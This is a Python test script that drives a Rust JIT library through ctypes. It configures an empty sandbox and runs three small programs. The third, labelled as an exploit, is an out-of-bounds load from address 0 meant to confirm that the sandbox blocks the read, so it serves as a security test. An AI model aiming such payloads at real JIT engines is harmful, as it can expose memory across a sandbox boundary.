import ctypes, json, sys

lib = ctypes.CDLL('./target/release/librssn.so')

# Set proper argtypes for all functions
lib.rssn_jit_create.restype = ctypes.c_void_p
lib.rssn_jit_create.argtypes = []

lib.rssn_jit_configure_sandbox_json.restype = ctypes.c_char_p
lib.rssn_jit_configure_sandbox_json.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

lib.rssn_jit_compile_json.restype = ctypes.c_char_p
lib.rssn_jit_compile_json.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

lib.rssn_jit_execute.restype = ctypes.c_double
lib.rssn_jit_execute.argtypes = [ctypes.c_void_p, ctypes.c_void_p]

engine = lib.rssn_jit_create()
print('Engine:', hex(engine), flush=True)

# Configure empty sandbox (no memory regions, no call targets)
conf = json.dumps({'memory_regions': [], 'allowed_calls': []})
res = lib.rssn_jit_configure_sandbox_json(engine, conf.encode())
print('Config result:', res, flush=True)

# Test 1: Empty program
payload = json.dumps({'instructions': []})
res = lib.rssn_jit_compile_json(engine, payload.encode())
print('Compile empty:', res, flush=True)
data = json.loads(res)
if data.get('ok'):
    result = lib.rssn_jit_execute(engine, data['ok'])
    print('Execute empty result:', result, flush=True)

# Test 2: ImmF + Return
payload = json.dumps({'instructions': [{'ImmF': 3.14}, {'Return': None}]})
res = lib.rssn_jit_compile_json(engine, payload.encode())
print('Compile ImmF+Return:', res, flush=True)
data = json.loads(res)
if data.get('ok'):
    result = lib.rssn_jit_execute(engine, data['ok'])
    print('Execute ImmF+Return result:', result, flush=True)

# Test 3: Malicious Load OOB (THE EXPLOIT)
payload = json.dumps({'instructions': [{'ImmI': 0}, {'Load': 'I64'}, {'Return': None}]})
res = lib.rssn_jit_compile_json(engine, payload.encode())
print('Compile Load OOB:', res, flush=True)
data = json.loads(res)
if data.get('ok'):
    result = lib.rssn_jit_execute(engine, data['ok'])
    print('Execute Load OOB result (should be NaN):', result, flush=True)

print('All tests passed!', flush=True)
